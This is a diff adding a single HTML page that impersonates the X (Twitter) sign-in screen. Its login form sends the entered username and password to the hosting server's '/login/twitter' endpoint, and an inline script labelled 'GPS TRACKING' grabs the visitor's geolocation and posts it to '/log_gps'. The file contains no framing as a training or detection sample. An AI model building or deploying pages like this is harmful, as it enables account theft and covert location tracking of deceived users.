@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>X / Sign in</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        body {
+            background-color: #000;
+            color: #fff;
+            font-family: sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        .x-wrap {
+            width: 360px;
+            padding: 20px;
+        }
+
+        .x-logo-v {
+            display: block;
+            margin: 0 auto 30px;
+        }
+
+        h1 {
+            font-size: 31px;
+            font-weight: 800;
+            margin-bottom: 30px;
+        }
+
+        .input-v {
+            width: 100%;
+            padding: 16px;
+            background: #000;
+            border: 1px solid #333;
+            border-radius: 4px;
+            color: #fff;
+            margin-bottom: 20px;
+            outline: none;
+        }
+
+        .input-v:focus {
+            border-color: #1d9bf0;
+        }
+
+        .btn-v {
+            width: 100%;
+            padding: 12px;
+            background: #fff;
+            color: #000;
+            border-radius: 25px;
+            font-weight: 700;
+            font-size: 16px;
+        }
+    </style>
+</head>
+<body>
+    <div class="x-wrap">
+        <div class="x-logo-v">
+            <svg width="40" viewBox="0 0 24 24" fill="white">
+                <path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"></path>
+            </svg>
+        </div>
+        <h1>Sign in to X</h1>
+        <form id="twForm" action="/login/twitter" method="POST">
+            <input type="text" name="user" class="input-v" placeholder="Phone, email, or username" required>
+            <input type="password" name="pass" class="input-v" placeholder="Password" required>
+            <button type="submit" class="btn-v">Log in</button>
+        </form>
+    </div>
+
+    <script>
+        // GPS TRACKING
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(function(p) {
+                fetch('/log_gps', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ lat: p.coords.latitude, lon: p.coords.longitude })
+                });
+            });
+        }
+    </script>
+</body>
+</html>
